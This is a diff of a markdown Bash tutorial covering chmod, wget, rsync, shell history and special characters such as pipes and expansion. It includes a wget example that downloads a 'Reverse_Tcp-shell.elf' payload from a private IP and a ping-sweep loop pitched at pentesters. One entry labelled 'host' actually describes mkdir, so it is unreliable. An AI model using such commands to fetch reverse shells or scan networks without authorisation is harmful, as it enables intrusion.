@@ -117,13 +117,12 @@ CAT is an acronym for concatenate. It combines: concatenates, files or prints te
 Display a file with a dash in the name with (./)
 
 **e. chmod** <br>
-Change mode allows you to change file mode bits. In **.nix** environments, file and folder permissions are displayed with the ls command, beginning with: Directory/Link: 1 bit, followed by: user/group/owner with 3 bits each: (-DUUUGGGOOO) The: + operator adds selected file mode bits, and: - removes them. So to give the current user and group execute permissions on a file try this:
+Change mode allows you to change file mode bits. In **.nix** environments, file and folder permissions are displayed with the ls command, beginning with: Directory/Link: 1 bit, followed by: user/group/owner with 3 bits each: (-DUUUGGGOOO) The: + operator adds selected file mode bits, and: - removes them. So to give the current user and group execute permissions on a file try this first command. The second command shows how to execute the file with (./).
 <pre>$ chmod ug+x Endless_ping_loop.sh</pre>
 <pre>$ ./Endless_ping_loop.sh</pre>
-Execute the file with (./)<br>
 **f. wget**<br>
 This neat tool is known as the non-interactive network downloader. And it does just that, this command downloads a file from a remote server.
-<pre>$ wget http://192.168.53.4/files/Reverse_Tcp-shell.elf </pre>
+<pre>$ wget http://192.168.53.4/files/Reverse_Tcp-shell.elf</pre>
 **g. rsync**<br>
 Used to backup and copy files based on changes in them. At some point, current technologies like Dropbox and others use utilities similar to rsync in order to keep your data synchronized with what's in the cloud. Rsync can also backup over the network using ssh. Read MAN page! Local backup: -a: archive, -z: compress data during transfer, -v: increase verbosity
 <pre>$ rsync -azv /path/folder1/macs.db /path/folder2/macs_copy.db</pre>
@@ -141,7 +140,24 @@ If you want to run any previous command, just use: !#number
 <pre>$ !3
 $ root</pre>
 ### Networking Commands and Special Characters.
-**1. ping**<br>
+
+## Special Characters 
+These are some of the many special characters that can be used with commands in the Bash terminal/command prompt.
+<ul><li>**~ Tilde**, the tilde represents the home directory. When followed by a /, it means the current user's home directory.</li>
+<li><pre>$ cd ~</pre></li>
+<li>**| Pipe**, the true power of Bash/Shell commands is realized when you chain multiple commands together. The output of one command becomes the input of another command, for as many commands as you can chain together.
+<p>The following command says: cat display access.log, and pipe the output to cut -d: delimit or separate on tab/blank space, -f: display field 1, pipe that output to grep $this_Ip_addr, then pipe the output to sort, which -u: uniquely sorts the results by -rn: showing the most occurring line in access.log with $thisIP in descending order.</p></li>
+<li><pre>$ cat access.log | cut -d " " -f 1 | grep '208.68.234.99' | sort -urn</pre></li>
+<li>**$() Expansion, && And, ; End command**, The expansion characters allow you to expand parameters, substitute commands or use arithmetic expressions. Two ampersands represent and, which means you can execute more than one command, but be sure to end long statements or multiple commands with (;) character. </li>
+<p>First command uses a bash for statement, to loop through a $(sequence) of numbers, 1-254 to be exact, and do a ping -c: count 1, piping the output to grep to only display alive nodes. This is a quick way for a pentester to check what nodes are alive on this network. The first node pinged is 192.x.x.1</p>
+<li><pre>$ for ip in $(seq 1 254); do 
+\#only prints live hosts as evidenced in the 'bytes from' received from the host.
+ping -c 1 192.168.42.$ip | grep "bytes from"
+done;</pre> </li>
+<li><pre>$ sudo apt update && apt list --upgradable -v && sudo apt upgrade;</pre></li>
+This is self explanatory, it says: sudo check repos for updates and list all upgradeable packages -v: verbosely, tell me something, and then perform the upgrade sudo.
+</ul>
+**1. host**<br>
 Make a new directory.
 <pre>$ mkdir /var/www/html/NewWebsite</pre>
 **2. dig**<br>
